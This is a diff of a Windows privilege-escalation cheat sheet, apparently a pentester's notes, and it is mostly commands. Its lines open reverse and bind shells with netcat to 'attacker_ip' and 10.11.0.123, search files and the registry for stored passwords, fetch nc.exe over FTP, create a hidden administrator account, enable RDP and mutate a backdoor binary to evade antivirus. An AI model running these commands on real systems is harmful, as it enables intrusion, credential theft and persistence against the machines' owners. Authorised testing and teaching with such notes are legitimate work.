@@ -1,14 +1,18 @@
 *Windows elevation of privileges*narrative
 Shell
     Getting a shell
-    *$ system(“start cmd.exe /k $cmd”)*
+    *$ system("start cmd.exe /k $cmd")*
+    *$ nc.exe attacker_ip attacker_port -e cmd.exe*
 
     Getting a reverse shell
-    *$ nc -Lp 31337 -vv -e cmd.exe*
+    *$ nc.exe -Lp 31337 -vv -e cmd.exe*
 
-System info
+EoP0: System info
     Find installed patches, architecture, OS version
     *$ systeminfo*
+
+    Get system version
+    *$ type C:/Windows/system32/eula.txt
 
     Hostname.
     *$ hostname*
@@ -50,7 +54,7 @@ $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe 
     *$ wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]*
 
-Find unquoted paths
+EoP2: Find unquoted paths
     *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
 
     For example, the following path would be vulnerable:
@@ -60,7 +64,7 @@ Find unquoted paths
 
 
 
-ClearText passwords
+EoP3: ClearText passwords (quick hits)
     Search for them
     *$findstr /si password *.txt
 findstr /si password *.xml
@@ -77,21 +81,23 @@ findstr /spin "password" *.*
 In Files*
 
     These are common files to find them in. They might be base64-encoded. So look out for that.
-    *$c:\sysprep.inf
-c:\sysprep\sysprep.xml
-c:\unattend.xml
-%WINDIR%\Panther\Unattend\Unattended.xml
-%WINDIR%\Panther\Unattended.xml*
+    *$ type c:\sysprep.inf
+type c:\sysprep\sysprep.xml
+type c:\unattend.xml
+type %WINDIR%\Panther\Unattend\Unattended.xml
+type %WINDIR%\Panther\Unattended.xml*
 
     *$ dir c:\*vnc.ini /s /b
 dir c:\*ultravnc.ini /s /b
 dir c:\ /s /b | findstr /si *vnc.ini*
 
     Stuff in the registry:
-    *$ reg query "HKCU\Software\ORL\WinVNC3\Password"
+    *$ reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"*
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password*
 
     Search for password in registry
     *$ reg query HKLM /f password /t REG_SZ /s
@@ -99,7 +105,7 @@ reg query HKCU /f password /t REG_SZ /s*
 
 
 
-Services only available from loopback
+EoP5: Services only available from loopback
     look for LISTENING/LISTEN
     *netstat -ano*
 
@@ -115,8 +121,6 @@ portfwd add -l 3306 -p 3306 -r 192.168.1.101*
     If powershell is blocked, you can download:
     *https://github.com/Ben0xA/nps*
 
-    Downloading files in Windows:
-    *(new-object System.Net.WebClient).DownloadFile('http://1.1.1.1/file.exe','C:\Users\Administrator\Desktop\file.exe')*
 
     Once you know the updates installed, you can find known exploits using windows-exploit-suggester.
     *$ ./windows-exploit-suggester.py -d 2017-02-09-mssb.xls -p ms16-075
@@ -129,10 +133,6 @@ portfwd add -l 3306 -p 3306 -r 192.168.1.101*
     Compile windows exploit in linux:
     *$ i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe*
 
-AV bypass
-    Generating a mutated binary to bypass antiviruses
-    *$ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe*
-
 Metasploit
     Module to elevate privileges to SYSTEM by creating a service or hijacking existing ones with incorrect permissions
     *$ exploit/windows/local/service_permissions*
@@ -141,7 +141,7 @@ Metasploit
 https://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/windows-privesc-check2.exe*
 
 
-Update & exploits
+EoP6: Kernel exploits
     Find installed paths:
     *$ wmic qfe get Caption,Description,HotFixID,InstalledOn*
     *Exploit-DB Vuln Name             MS#         2K         XP      2003      2008    Vista 7
@@ -204,9 +204,13 @@ Windows 7                      6.1.7600
 Windows 8.1                    6.3.9600
 Windows 10                     10.0.10240*
 
+Exploits worth looking at:
+    MS11-046
+    *https://github.com/SecWiki/windows-kernel-exploits*
+
 Useful commands
     Enable RDP access
-    *reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
+    *reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
 netsh firewall set service remoteadmin enable
 netsh firewall set service remotedesktop enable*
 
@@ -216,6 +220,10 @@ netsh firewall set service remotedesktop enable*
     Add a new user
     *$ net user test 1234 /add
 $ net localgroup administrators test /add*
+    Print files contents:
+    *$ type file*
+    Remove file
+    *$ del /f file*
 
 Transferring files
     with ftp (run ftp.sh in your box):
@@ -227,6 +235,17 @@ echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 nc.exe 10.11.0.123 1234 -e cmd.exe*
+    Bounce port sannning
+    *$ $ nc $ip 21
+220 Femitter FTP Server ready.
+USER anonymous
+331 Password required for anonymous.
+PASS foo
+230 User anonymous logged in.
+PORT 127,0,0,1,0,80
+200 Port command successful.
+LIST*
+
 
     With RDP:
     *$ rdesktop (ip) -r disk:share=/home/bayo/store*
@@ -259,11 +278,9 @@ msf > run*
 From admin to system
     *psexec.exe -i -s %SystemRoot%\system32\cmd.exe*
 
-Other commands
-    Print files contents:
-    *$ type file*
-    Remove file
-    *$ del /f file*
+AV bypass
+    Generating a mutated binary to bypass antiviruses
+    *$ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe*
 
 Get proof
     *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"*
